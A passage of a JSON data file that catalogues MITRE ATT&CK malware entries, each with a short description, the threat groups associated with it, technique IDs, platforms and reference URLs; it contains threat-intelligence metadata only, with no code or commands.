      "description": "[Pony](https://attack.mitre.org/software/S0453) is a credential stealing malware, though has also been used among adversaries for its downloader capabilities. The source code for Pony Loader 1.0 and 2.0 were leaked online, leading to their use by various threat actors.(Citation: Malwarebytes Pony April 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1106",
        "T1204.002",
        "T1027.015",
        "T1036",
        "T1105",
        "T1059.003",
        "T1027.016",
        "T1566.002",
        "T1082",
        "T1497.003",
        "T1204.001",
        "T1071.001",
        "T1566.001",
        "T1087.001",
        "T1110.001",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0453",
      "stix_id": "malware--222ba512-32d9-49ac-aefd-50ce981ce2ce",
      "created": "2020-05-21T21:03:35.244000+00:00",
      "modified": "2025-04-25T14:42:50.153000+00:00"
    },
    "S0059": {
      "id": "S0059",
      "name": "WinMM",
      "description": "[WinMM](https://attack.mitre.org/software/S0059) is a full-featured, simple backdoor used by [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1083",
        "T1082",
        "T1008",
        "T1071.001",
        "T1033"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0059",
      "stix_id": "malware--22addc7b-b39f-483d-979a-1b35147da5de",
      "created": "2017-05-31T21:32:40.004000+00:00",
      "modified": "2025-04-25T14:42:50.511000+00:00"
    },
    "S0630": {
      "id": "S0630",
      "name": "Nebulae",
      "description": "[Nebulae](https://attack.mitre.org/software/S0630) Is a backdoor that has been used by [Naikon](https://attack.mitre.org/groups/G0019)  since at least 2020.(Citation: Bitdefender Naikon April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1082",
        "T1005",
        "T1095",
        "T1547.001",
        "T1057",
        "T1106",
        "T1036.004",
        "T1070.004",
        "T1543.003",
        "T1036.005",
        "T1574.001",
        "T1059.003",
        "T1083",
        "T1573.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0630",
      "stix_id": "malware--22b17791-45bf-45c0-9322-ff1a0af5cf2b",
      "created": "2021-06-30T14:44:35.055000+00:00",
      "modified": "2025-04-25T14:42:50.875000+00:00"
    },
    "S0163": {
      "id": "S0163",
      "name": "Janicab",
      "description": "[Janicab](https://attack.mitre.org/software/S0163) is an OS X trojan that relied on a valid developer ID and oblivious users to install it. (Citation: Janicab)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1053.003",
        "T1123",
        "T1553.002",
        "T1113"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0163",
      "stix_id": "malware--234e7770-99b0-4f65-b983-d3230f76a60b",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2024-09-12T19:07:36.511000+00:00"
    },
    "S0347": {
      "id": "S0347",
      "name": "AuditCred",
      "description": "[AuditCred](https://attack.mitre.org/software/S0347) is a malicious DLL that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) during their 2018 attacks.(Citation: TrendMicro Lazarus Nov 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1090",
        "T1070.004",
        "T1055",
        "T1105",
        "T1059.003",
        "T1140",
        "T1543.003",
        "T1027.013"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0347",
      "stix_id": "malware--24b4ce59-eaac-4c8b-8634-9b093b7ccd92",
      "created": "2019-01-30T15:47:41.018000+00:00",
      "modified": "2024-04-11T02:57:01.302000+00:00"
    },
    "S0010": {
      "id": "S0010",
      "name": "Lurid",
      "description": "[Lurid](https://attack.mitre.org/software/S0010) is a malware family that has been used by several groups, including [PittyTiger](https://attack.mitre.org/groups/G0011), in targeted attacks as far back as 2006. (Citation: Villeneuve 2014) (Citation: Villeneuve 2011)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1560"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0010",
      "stix_id": "malware--251fbae2-78f6-4de7-84f6-194c727a64ad",
      "created": "2017-05-31T21:32:14.527000+00:00",
      "modified": "2025-04-25T14:42:51.586000+00:00"
    },
    "S1164": {
      "id": "S1164",
      "name": "UPSTYLE",
      "description": "[UPSTYLE](https://attack.mitre.org/software/S1164) is a Python-based backdoor associated with exploitation of Palo Alto firewalls using CVE-2024-3400 in early 2024. [UPSTYLE](https://attack.mitre.org/software/S1164) has only been observed in relation to this exploitation activity, which involved attempted install on compromised devices by the threat actor UTA0218.(Citation: Volexity UPSTYLE 2024)(Citation: Palo Alto MidnightEclipse APR 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.002",
        "T1140",
        "T1027.013",
        "T1036",
        "T1070.004",
        "T1001.001",
        "T1070.006",
        "T1102.003",
        "T1057",
        "T1546",
        "T1059.006",
        "T1665"
      ],
      "platforms": [
        "Network Devices",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1164",
      "stix_id": "malware--2692bdd0-da52-44ff-88a3-9db28b948ea2",
      "created": "2024-11-20T21:55:54.792000+00:00",
      "modified": "2025-04-15T19:46:33.707000+00:00"
    },
    "S0088": {
      "id": "S0088",
      "name": "Kasidet",
      "description": "[Kasidet](https://attack.mitre.org/software/S0088) is a backdoor that has been dropped by using malicious VBA macros. (Citation: Zscaler Kasidet)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1082",
        "T1057",
        "T1547.001",
        "T1518.001",
        "T1113",
        "T1105",
        "T1083",
        "T1056.001",
        "T1562.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0088",
      "stix_id": "malware--26fed817-e7bf-41f9-829a-9075ffac45c2",
      "created": "2017-05-31T21:32:57.344000+00:00",
      "modified": "2025-04-25T14:42:52.151000+00:00"
    },
    "S1211": {
      "id": "S1211",
      "name": "Hannotog",
      "description": "[Hannotog](https://attack.mitre.org/software/S1211) is a type of backdoor malware uniquely assoicated with [Lotus Blossom](https://attack.mitre.org/groups/G0030) operations since at least 2022.(Citation: Symantec Bilbug 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1571",
        "T1489",
        "T1562.004",
        "T1020",
        "T1543.003",
        "T1059.003",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1211",
      "stix_id": "malware--273e2b53-64ec-48be-9ad9-8f3dc0e53718",
      "created": "2025-03-16T09:55:45.092000+00:00",
      "modified": "2025-04-04T17:35:36.538000+00:00"
    },
    "S0346": {
      "id": "S0346",
      "name": "OceanSalt",
      "description": "[OceanSalt](https://attack.mitre.org/software/S0346) is a Trojan that was used in a campaign targeting victims in South Korea, United States, and Canada. [OceanSalt](https://attack.mitre.org/software/S0346) shares code similarity with [SpyNote RAT](https://attack.mitre.org/software/S0305), which has been linked to [APT1](https://attack.mitre.org/groups/G0006).(Citation: McAfee Oceansalt Oct 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1132.002",
        "T1016",
        "T1083",
        "T1070.004",
        "T1082",
        "T1057",
        "T1566.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0346",
      "stix_id": "malware--288fa242-e894-4c7e-ac86-856deedf5cea",
      "created": "2019-01-30T15:43:19.105000+00:00",
      "modified": "2025-04-25T14:42:52.708000+00:00"
    },
    "S1162": {
      "id": "S1162",
      "name": "Playcrypt",
      "description": "[Playcrypt](https://attack.mitre.org/software/S1162) is a ransomware that has been used by [Play](https://attack.mitre.org/groups/G1040) since at least 2022 in attacks against against the business, government, critical infrastructure, healthcare, and media sectors in North America, South America, and Europe. [Playcrypt](https://attack.mitre.org/software/S1162) derives its name from adding the .play extension to encrypted files and has overlap with tactics and tools associated with Hive and Nokoyawa ransomware and infrastructure associated with Quantum ransomware.(Citation: Microsoft PlayCrypt August 2022)(Citation: CISA Play Ransomware Advisory December 2023)(Citation: Trend Micro Ransomware Spotlight Play July 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1486",
        "T1490",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1162",
      "stix_id": "malware--28ad4983-151e-4e30-9792-768470e92b3e",
      "created": "2024-09-25T17:16:06.149000+00:00",
      "modified": "2024-10-02T05:37:59.575000+00:00"
    },
    "S0252": {
      "id": "S0252",
      "name": "Brave Prince",
      "description": "[Brave Prince](https://attack.mitre.org/software/S0252) is a Korean-language implant that was first observed in the wild in December 2017. It contains similar code and behavior to [Gold Dragon](https://attack.mitre.org/software/S0249), and was seen along with [Gold Dragon](https://attack.mitre.org/software/S0249) and [RunningRAT](https://attack.mitre.org/software/S0253) in operations surrounding the 2018 Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1048.003",
        "T1057",
        "T1083",
        "T1012",
        "T1016",
        "T1562.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0252",
      "stix_id": "malware--28b97733-ef07-4414-aaa5-df50b2d30cc5",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-16T20:37:59.301000+00:00"
    },
    "S0629": {
      "id": "S0629",
      "name": "RainyDay",
      "description": "[RainyDay](https://attack.mitre.org/software/S0629) is a backdoor tool that has been used by [Naikon](https://attack.mitre.org/groups/G0019) since at least 2020.(Citation: Bitdefender Naikon April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.005",
        "T1106",
        "T1070.004",
        "T1567.002",
        "T1105",
        "T1140",
        "T1071.001",
        "T1036.004",
        "T1007",
        "T1057",
        "T1074.001",
        "T1555.003",
        "T1027.013",
        "T1008",
        "T1543.003",
        "T1059.003",
        "T1090",
        "T1113",
        "T1083",
        "T1555.004",
        "T1053.005",
        "T1095",
        "T1573.001",
        "T1574.001",
        "T1005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0629",
      "stix_id": "malware--29231689-5837-4a7a-aafc-1b65b3f50cc7",
      "created": "2021-06-29T14:46:45.468000+00:00",
      "modified": "2024-04-11T00:22:35.591000+00:00"
    },
    "S0624": {
      "id": "S0624",
      "name": "Ecipekac",
      "description": "[Ecipekac](https://attack.mitre.org/software/S0624) is a multi-layer loader that has been used by [menuPass](https://attack.mitre.org/groups/G0045) since at least 2019 including use as a loader for [P8RAT](https://attack.mitre.org/software/S0626), [SodaMaster](https://attack.mitre.org/software/S0627), and [FYAnti](https://attack.mitre.org/software/S0628).(Citation: Securelist APT10 March 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027",
        "T1553.002",
        "T1574.001",
        "T1105",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0624",
      "stix_id": "malware--292eb0c5-b8e8-4af6-9e8f-0fda6b4528d3",
      "created": "2021-06-18T18:56:41.244000+00:00",
      "modified": "2025-04-25T14:42:53.604000+00:00"
    },
    "S0622": {
      "id": "S0622",
      "name": "AppleSeed",
      "description": "[AppleSeed](https://attack.mitre.org/software/S0622) is a backdoor that has been used by [Kimsuky](https://attack.mitre.org/groups/G0094) to target South Korean government, academic, and commercial  targets since at least 2021.(Citation: Malwarebytes Kimsuky June 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.007",
        "T1059.001",
        "T1027.002",
        "T1016",
        "T1036",
        "T1566.001",
        "T1140",
        "T1057",
        "T1134",
        "T1056.001",
        "T1005",
        "T1036.005",
        "T1082",
        "T1119",
        "T1567",
        "T1030",
        "T1106",
        "T1560",
        "T1008",
        "T1041",
        "T1083",
        "T1027",
        "T1071.001",
        "T1070.004",
        "T1113",
        "T1204.002",
        "T1074.001",
        "T1560.001",
        "T1547.001",
        "T1025",
        "T1124",
        "T1218.010"
      ],
      "platforms": [
        "Windows",
        "Android"
      ],
      "url": "https://attack.mitre.org/software/S0622",
      "stix_id": "malware--295721d2-ee20-4fa3-ade3-37f4146b4570",
      "created": "2021-06-10T14:53:49.448000+00:00",
      "modified": "2025-04-25T14:42:53.967000+00:00"
    },
    "S1118": {
      "id": "S1118",
      "name": "BUSHWALK",
      "description": "[BUSHWALK](https://attack.mitre.org/software/S1118) is a web shell written in Perl that was inserted into the legitimate querymanifest.cgi file on compromised Ivanti Connect Secure VPNs during [Cutting Edge](https://attack.mitre.org/campaigns/C0029).(Citation: Mandiant Cutting Edge Part 2 January 2024)(Citation: Mandiant Cutting Edge Part 3 February 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1205",
        "T1505.003",
        "T1554",
        "T1140",
        "T1027"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1118",
      "stix_id": "malware--29a0bb87-1162-4c83-9834-2a98a876051b",
      "created": "2024-03-07T20:16:36.898000+00:00",
      "modified": "2025-04-15T19:46:33.793000+00:00"
    },
    "S1048": {
      "id": "S1048",
      "name": "macOS.OSAMiner",
      "description": "[macOS.OSAMiner](https://attack.mitre.org/software/S1048) is a Monero mining trojan that was first observed in 2018; security researchers assessed [macOS.OSAMiner](https://attack.mitre.org/software/S1048) may have been circulating since at least 2015. [macOS.OSAMiner](https://attack.mitre.org/software/S1048) is known for embedding one run-only AppleScript into another, which helped the malware evade full analysis for five years due to a lack of Apple event (AEVT) analysis tools.(Citation: SentinelLabs reversing run-only applescripts 2021)(Citation: VMRay OSAMiner dynamic analysis 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1497.001",
        "T1027.008",
        "T1027.009",
        "T1082",
        "T1543.001",
        "T1569.001",
        "T1562.001",
        "T1057",
        "T1059.002"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S1048",
      "stix_id": "malware--2a59a237-1530-4d55-91f9-2aebf961cc37",
      "created": "2022-10-04T06:35:40.506000+00:00",
      "modified": "2025-04-16T20:37:59.825000+00:00"
    },
    "S0042": {
      "id": "S0042",
      "name": "LOWBALL",
      "description": "[LOWBALL](https://attack.mitre.org/software/S0042) is malware used by [admin@338](https://attack.mitre.org/groups/G0018). It was used in August 2015 in email messages targeting Hong Kong-based media organizations. (Citation: FireEye admin@338)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1105",
        "T1102.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0042",
      "stix_id": "malware--2a6f4c7b-e690-4cc7-ab6b-1f821fb6b80b",
      "created": "2017-05-31T21:32:33.348000+00:00",
      "modified": "2025-04-25T14:42:54.704000+00:00"
    },
    "S0198": {
      "id": "S0198",
      "name": "NETWIRE",
      "description": "[NETWIRE](https://attack.mitre.org/software/S0198) is a publicly available, multiplatform remote administration tool (RAT) that has been used by criminal and APT groups since at least 2012.(Citation: FireEye APT33 Sept 2017)(Citation: McAfee Netwire Mar 2015)(Citation: FireEye APT33 Webinar Sept 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1090",
        "T1547.001",
        "T1027.002",
        "T1573.001",
        "T1560.003",
        "T1204.002",
        "T1204.001",
        "T1119",
        "T1547.013",
        "T1059.005",
        "T1027",
        "T1059.001",
        "T1055",
        "T1053.003",
        "T1027.011",
        "T1083",
        "T1057",
        "T1059.004",
        "T1049",
        "T1560",
        "T1555.003",
        "T1566.002",
        "T1555",
        "T1036.005",
        "T1102",
        "T1564.001",
        "T1010",
        "T1059.003",
        "T1036.001",
        "T1056.001",
        "T1106",
        "T1053.005",
        "T1113",
        "T1547.015",
        "T1016",
        "T1071.001",
        "T1055.012",
        "T1112",
        "T1082",
        "T1566.001",
        "T1074.001",
        "T1095",
        "T1573",
        "T1543.001",
        "T1105"
      ],
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0198",
      "stix_id": "malware--2a70812b-f1ef-44db-8578-a496a227aef2",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-16T20:38:00.152000+00:00"
    },
    "S0668": {
      "id": "S0668",
      "name": "TinyTurla",
      "description": "[TinyTurla](https://attack.mitre.org/software/S0668) is a backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010) against targets in the US, Germany, and Afghanistan since at least 2020.(Citation: Talos TinyTurla September 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.002",
        "T1106",
        "T1036.005",
        "T1569.002",
        "T1112",
        "T1059.003",
        "T1105",
        "T1027.011",
        "T1036.004",
        "T1029",
        "T1012",
        "T1008",
        "T1005",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0668",
      "stix_id": "malware--2a7c1bb7-cd12-456e-810d-ab3bf8457bab",
      "created": "2021-12-02T15:09:20.899000+00:00",
      "modified": "2025-04-16T20:38:00.312000+00:00"
    },
    "S1032": {
      "id": "S1032",
      "name": "PyDCrypt",
      "description": "[PyDCrypt](https://attack.mitre.org/software/S1032) is malware written in Python designed to deliver [DCSrv](https://attack.mitre.org/software/S1033). It has been used by [Moses Staff](https://attack.mitre.org/groups/G1009) since at least September 2021, with each sample tailored for its intended victim organization.(Citation: Checkpoint MosesStaff Nov 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.006",
        "T1059.003",
        "T1036.005",
        "T1140",
        "T1562.004",
        "T1049",
        "T1027.013",
        "T1059.001",
        "T1047",
        "T1033",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1032",
      "stix_id": "malware--2ac41e8b-4865-4ced-839d-78e7852c47f3",
      "created": "2022-08-11T22:00:20.194000+00:00",
      "modified": "2024-04-11T00:23:58.415000+00:00"
    },
    "S1203": {
      "id": "S1203",
      "name": "J-magic",
      "description": "[J-magic](https://attack.mitre.org/software/S1203) is a custom variant of the [cd00r](https://attack.mitre.org/software/S1204) backdoor tailored to target Juniper routers that was first observed during the [J-magic Campaign](https://attack.mitre.org/campaigns/C0050) in mid-2023. [J-magic](https://attack.mitre.org/software/S1203) monitors TCP traffic for five predefined parameters or \"magic packets\" to be sent by the attackers before activating on compromised devices.(Citation: Lumen J-Magic JAN 2025)\n\n",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.005",
        "T1070.003",
        "T1095",
        "T1016",
        "T1573.002",
        "T1205",
        "T1040",
        "T1059.004"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1203",
      "stix_id": "malware--2ade64da-5114-42e4-9d56-335379cca561",
      "created": "2025-02-18T17:59:32.603000+00:00",
      "modified": "2025-04-15T19:46:33.873000+00:00"
    },
    "S1173": {
      "id": "S1173",
      "name": "PowerExchange",
      "description": "[PowerExchange](https://attack.mitre.org/software/S1173) is a PowerShell backdoor that has been used by [OilRig](https://attack.mitre.org/groups/G0049) since at least 2023 including against government targets in the Middle East.(Citation: Symantec Crambus OCT 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1041",
        "T1071.003",
        "T1140",
        "T1059.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1173",
      "stix_id": "malware--2c9d23e7-bfd6-4e23-a512-aee3bc1474f4",
      "created": "2024-11-27T19:36:32.094000+00:00",
      "modified": "2024-11-27T19:38:21.789000+00:00"
    },
    "S0537": {
      "id": "S0537",
      "name": "HyperStack",
      "description": "[HyperStack](https://attack.mitre.org/software/S0537) is a RPC-based backdoor used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2018. [HyperStack](https://attack.mitre.org/software/S0537) has similarities to other backdoors used by [Turla](https://attack.mitre.org/groups/G0010) including [Carbon](https://attack.mitre.org/software/S0335).(Citation: Accenture HyperStack October 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1078.001",
        "T1106",
        "T1559",
        "T1112",
        "T1573.001",
        "T1087.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0537",
      "stix_id": "malware--2cf7dec3-66fc-423f-b2c7-58f1de243b4e",
      "created": "2020-12-02T20:48:23.462000+00:00",
      "modified": "2025-04-25T14:42:55.977000+00:00"
    },
    "S0278": {
      "id": "S0278",
      "name": "iKitten",
      "description": "[iKitten](https://attack.mitre.org/software/S0278) is a macOS exfiltration agent  (Citation: objsee mac malware 2017).",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1056.002",
        "T1057",
        "T1560.001",
        "T1564.001",
        "T1555.001",
        "T1037.004"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0278",
      "stix_id": "malware--2cfe8a26-5be7-4a09-8915-ea3d9e787513",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:42:56.342000+00:00"
    },
    "S0037": {
      "id": "S0037",
      "name": "HAMMERTOSS",
      "description": "[HAMMERTOSS](https://attack.mitre.org/software/S0037) is a backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2015. (Citation: FireEye APT29) (Citation: F-Secure The Dukes)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1567.002",
        "T1001.002",
        "T1564.003",
        "T1573.001",
        "T1071.001",
        "T1059.001",
        "T1102.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0037",
      "stix_id": "malware--2daa14d6-cbf3-4308-bb8e-213c324a08e4",
      "created": "2017-05-31T21:32:29.203000+00:00",
      "modified": "2024-11-17T14:55:19.537000+00:00"
    },
    "S0138": {
      "id": "S0138",
      "name": "OLDBAIT",
      "description": "[OLDBAIT](https://attack.mitre.org/software/S0138) is a credential harvester used by [APT28](https://attack.mitre.org/groups/G0007). (Citation: FireEye APT28) (Citation: FireEye APT28 January 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.005",
        "T1555.003",
        "T1071.003",
        "T1027",
        "T1555",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0138",
      "stix_id": "malware--2dd34b01-6110-4aac-835d-b5e7b936b0be",
      "created": "2017-05-31T21:33:18.946000+00:00",
      "modified": "2024-11-17T14:43:38.590000+00:00"
    },
    "S0606": {
      "id": "S0606",
      "name": "Bad Rabbit",
      "description": "[Bad Rabbit](https://attack.mitre.org/software/S0606) is a self-propagating ransomware that affected the Ukrainian transportation sector in 2017. [Bad Rabbit](https://attack.mitre.org/software/S0606) has also targeted organizations and consumers in Russia. (Citation: Secure List Bad Rabbit)(Citation: ESET Bad Rabbit)(Citation: Dragos Apr 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1486",
        "T1110.003",
        "T1495",
        "T1569.002",
        "T1053.005",
        "T1036.005",
        "T1189",
        "T1003.001",
        "T1548.002",
        "T1057",
        "T1135",
        "T1210",
        "T1218.011",
        "T1204.002",
        "T1106"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0606",
      "stix_id": "malware--2eaa5319-5e1e-4dd7-bbc4-566fced3964a",
      "created": "2021-02-09T14:35:39.455000+00:00",
      "modified": "2025-01-02T19:45:31.402000+00:00"
    },
    "S0050": {
      "id": "S0050",
      "name": "CosmicDuke",
      "description": "[CosmicDuke](https://attack.mitre.org/software/S0050) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. (Citation: F-Secure The Dukes)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1543.003",
        "T1003.004",
        "T1048.003",
        "T1039",
        "T1555",
        "T1083",
        "T1555.003",
        "T1068",
        "T1115",
        "T1056.001",
        "T1113",
        "T1071.001",
        "T1114.001",
        "T1003.002",
        "T1020",
        "T1005",
        "T1053.005",
        "T1573.001",
        "T1025"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0050",
      "stix_id": "malware--2eb9b131-d333-4a48-9eb4-d8dec46c19ee",
      "created": "2017-05-31T21:32:36.550000+00:00",
      "modified": "2025-04-25T14:42:57.253000+00:00"
    },
    "S0152": {
      "id": "S0152",
      "name": "EvilGrab",
      "description": "[EvilGrab](https://attack.mitre.org/software/S0152) is a malware family with common reconnaissance capabilities. It has been deployed by [menuPass](https://attack.mitre.org/groups/G0045) via malicious Microsoft Office documents as part of spearphishing campaigns. (Citation: PWC Cloud Hopper Technical Annex April 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.001",
        "T1123",
        "T1125",
        "T1113",
        "T1547.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0152",
      "stix_id": "malware--2f1a9fd0-3b7c-4d77-a358-78db13adbe78",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-16T20:38:00.969000+00:00"
    },
    "S0634": {
      "id": "S0634",
      "name": "EnvyScout",
      "description": "[EnvyScout](https://attack.mitre.org/software/S0634) is a dropper that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1480",
        "T1204.002",
        "T1218.011",
        "T1005",
        "T1566.001",
        "T1140",
        "T1027.013",
        "T1059.007",
        "T1564.001",
        "T1059.003",
        "T1027.006",
        "T1187",
        "T1036"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0634",
      "stix_id": "malware--2f8229dc-da94-41c6-89ba-b5b6c32f6b7d",
      "created": "2021-08-02T15:31:32.397000+00:00",
      "modified": "2024-04-11T02:34:42.912000+00:00"
    },
    "S0058": {
      "id": "S0058",
      "name": "SslMM",
      "description": "[SslMM](https://attack.mitre.org/software/S0058) is a full-featured backdoor used by [Naikon](https://attack.mitre.org/groups/G0019) that has multiple variants. (Citation: Baumgartner Naikon 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1008",
        "T1547.009",
        "T1547.001",
        "T1056.001",
        "T1134",
        "T1562.001",
        "T1036.005",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0058",
      "stix_id": "malware--2fb26586-2b53-4b9a-ad4f-2b3bcb9a2421",
      "created": "2017-05-31T21:32:39.606000+00:00",
      "modified": "2025-04-25T14:42:57.989000+00:00"
    },
    "S1152": {
      "id": "S1152",
      "name": "IMAPLoader",
      "description": "[IMAPLoader](https://attack.mitre.org/software/S1152) is a .NET-based loader malware exclusively associated with [CURIUM](https://attack.mitre.org/groups/G1012) operations since at least 2022. [IMAPLoader](https://attack.mitre.org/software/S1152) leverages email protocols for command and control and payload delivery.(Citation: PWC Yellow Liderc 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1543",
        "T1106",
        "T1047",
        "T1082",
        "T1564.003",
        "T1574.014",
        "T1071.003",
        "T1105",
        "T1053.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1152",
      "stix_id": "malware--3058b264-fe6b-46be-8948-2d1fadaf8adf",
      "created": "2024-08-14T22:12:17.650000+00:00",
      "modified": "2024-10-02T12:20:43.866000+00:00"
    },
    "S0342": {
      "id": "S0342",
      "name": "GreyEnergy",
      "description": "[GreyEnergy](https://attack.mitre.org/software/S0342) is a backdoor written in C and compiled in Visual Studio. [GreyEnergy](https://attack.mitre.org/software/S0342) shares similarities with the [BlackEnergy](https://attack.mitre.org/software/S0089) malware and is thought to be the successor of it.(Citation: ESET GreyEnergy Oct 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1090.003",
        "T1218.011",
        "T1070.004",
        "T1543.003",
        "T1071.001",
        "T1553.002",
        "T1007",
        "T1573.002",
        "T1059.003",
        "T1105",
        "T1055.002",
        "T1573.001",
        "T1112",
        "T1027.002",
        "T1056.001",
        "T1027.013",
        "T1003.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0342",
      "stix_id": "malware--308b3d68-a084-4dfb-885a-3125e1a9c1e8",
      "created": "2019-01-30T13:53:14.264000+00:00",
      "modified": "2024-04-11T02:24:46.255000+00:00"
    },
    "S1198": {
      "id": "S1198",
      "name": "Gomir",
      "description": "Gomir is a Linux backdoor variant of the Go-based malware [GoBear](https://attack.mitre.org/software/S1197), uniquely assoicated with [Kimsuky](https://attack.mitre.org/groups/G0094) operations.(Citation: Symantec Troll Stealer 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573",
        "T1543.002",
        "T1018",
        "T1132.001",
        "T1053.003",
        "T1059.004",
        "T1071.001",
        "T1090.001",
        "T1083",
        "T1016",
        "T1082",
        "T1069.001",
        "T1070.004",
        "T1573.002"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1198",
      "stix_id": "malware--3128c86d-bd0d-445c-850f-96abf68fbfc3",
      "created": "2025-01-17T23:24:55.766000+00:00",
      "modified": "2025-01-17T23:37:56.323000+00:00"
    },
    "S0456": {
      "id": "S0456",
      "name": "Aria-body",
      "description": "[Aria-body](https://attack.mitre.org/software/S0456) is a custom backdoor that has been used by [Naikon](https://attack.mitre.org/groups/G0019) since approximately 2017.(Citation: CheckPoint Naikon May 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1095",
        "T1057",
        "T1106",
        "T1568.002",
        "T1140",
        "T1025",
        "T1016",
        "T1134.002",
        "T1071.001",
        "T1113",
        "T1033",
        "T1010",
        "T1082",
